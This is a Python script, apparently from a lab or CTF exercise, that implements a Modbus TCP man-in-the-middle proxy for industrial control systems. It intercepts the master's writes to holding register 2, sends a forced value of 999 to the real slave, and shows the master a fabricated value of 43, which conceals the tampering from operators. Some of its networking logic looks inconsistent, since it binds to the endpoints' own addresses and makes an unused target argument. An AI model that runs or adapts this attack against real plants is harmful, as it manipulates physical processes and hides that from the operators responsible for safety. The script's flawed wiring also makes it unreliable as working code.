#!/usr/bin/env python3

import threading
import socket
import struct
from pymodbus.client import ModbusTcpClient
from pymodbus.server import StartTcpServer
from pymodbus.datastore import (
    ModbusDeviceContext,
    ModbusServerContext,
    ModbusSequentialDataBlock,
)
from pymodbus.transaction import ModbusRtuFramer, ModbusSocketFramer

# Network configuration
MASTER_LISTEN_IP = "172.16.4.50"  # IP masteren forventer
SLAVE_LISTEN_IP = "172.16.4.51"   # IP slaven forventer  
MITM_PORT = 502

# Real endpoints
REAL_MASTER_IP = "172.16.4.50"  # eth0 side
REAL_SLAVE_IP = "172.16.4.51"   # eth1 side

TARGET_REGISTER = 2
FORCED_VALUE = 999
MASTER_SEES_VALUE = 43

# Global clients
master_client = None
slave_client = None

class MitmDataBlock(ModbusSequentialDataBlock):
    """Data block der logger og manipulerer data mellem master/slave"""
    
    def __init__(self, address, values):
        super().__init__(address, values)
        self.is_master_view = False  # True = master ser denne view
        
    def getValues(self, address, count=1, slave_id=1):
        values = super().getValues(address, count)
        direction = "MASTER->SLAVE" if self.is_master_view else "SLAVE->MASTER"
        print(f"[READ {direction}] addr={address}, count={count}, slave_id={slave_id} -> {values}")
        return values
    
    def setValues(self, address, values, slave_id=1):
        direction = "MASTER->SLAVE" if self.is_master_view else "SLAVE->MASTER"
        print(f"[WRITE {direction}] addr={address}, values={values}, slave_id={slave_id}")
        
        if self.is_master_view and address == TARGET_REGISTER:
            # Master skriver - forward FORCED_VALUE til real slave
            print(f"[MITM] Master skrev {values[0]}, sender {FORCED_VALUE} til real slave")
            if slave_client and slave_client.connected:
                slave_client.write_register(TARGET_REGISTER, FORCED_VALUE, slave_id=slave_id)
                # Lad master se sin ønskede værdi
                super().setValues(address, [MASTER_SEES_VALUE])
            return
        
        if not self.is_master_view and address == TARGET_REGISTER:
            # Slave svarer på read - vis manipuleret værdi til master
            print(f"[MITM] Slave har {values[0]}, master ser {MASTER_SEES_VALUE}")
            super().setValues(address, [MASTER_SEES_VALUE])
            return
            
        # Normal forwarding eller anden register
        super().setValues(address, values)

def create_datastore(is_master_view=False):
    """Opret datastore med korrekt view"""
    block = MitmDataBlock(0, [0] * 1000)
    block.is_master_view = is_master_view
    if is_master_view:
        # Initial værdi master ser
        block.setValues(TARGET_REGISTER, [MASTER_SEES_VALUE])
    store = ModbusDeviceContext(hr=block)
    return ModbusServerContext(devices=store, single=True)

def proxy_to_real_target(client_ip, target_ip, context, port=MITM_PORT):
    """Proxy forbindelser til real target"""
    server_context = create_datastore(is_master_view=(client_ip == REAL_MASTER_IP))
    
    print(f"[+] Proxy server for {client_ip} -> {target_ip}:{port}")
    StartTcpServer(
        server_context, 
        address=(client_ip, port),
        framer=ModbusSocketFramer
    )

def init_clients():
    """Initialiser connections til real devices"""
    global master_client, slave_client
    
    # Connect to real master (eth0 side)
    master_client = ModbusTcpClient(REAL_MASTER_IP, port=MITM_PORT)
    if master_client.connect():
        print(f"[+] Connected to real master {REAL_MASTER_IP}")
    else:
        print(f"[!] Failed to connect to real master {REAL_MASTER_IP}")
    
    # Connect to real slave (eth1 side)  
    slave_client = ModbusTcpClient(REAL_SLAVE_IP, port=MITM_PORT)
    if slave_client.connect():
        print(f"[+] Connected to real slave {REAL_SLAVE_IP}")
    else:
        print(f"[!] Failed to connect to real slave {REAL_SLAVE_IP}")

def main():
    print("=== OT Modbus MITM Proxy ===")
    print(f"Master ser: {MASTER_LISTEN_IP}:{MITM_PORT}")
    print(f"Slave ser:  {SLAVE_LISTEN_IP}:{MITM_PORT}")
    print(f"Manipulation: HR[{TARGET_REGISTER}] = {FORCED_VALUE} (real) / {MASTER_SEES_VALUE} (master ser)")
    print()
    
    # Initialiser clients
    init_clients()
    
    # Start proxy servers i separate threads
    master_thread = threading.Thread(
        target=proxy_to_real_target, 
        args=(MASTER_LISTEN_IP, REAL_SLAVE_IP, None)
    )
    slave_thread = threading.Thread(
        target=proxy_to_real_target, 
        args=(SLAVE_LISTEN_IP, REAL_MASTER_IP, None)
    )
    
    master_thread.daemon = True
    slave_thread.daemon = True
    
    master_thread.start()
    slave_thread.start()
    
    try:
        # Hold main thread alive
        master_thread.join()
    except KeyboardInterrupt:
        print("\n[!] Shutting down MITM proxy...")
        if master_client:
            master_client.close()
        if slave_client:
            slave_client.close()

if __name__ == "__main__":
    main()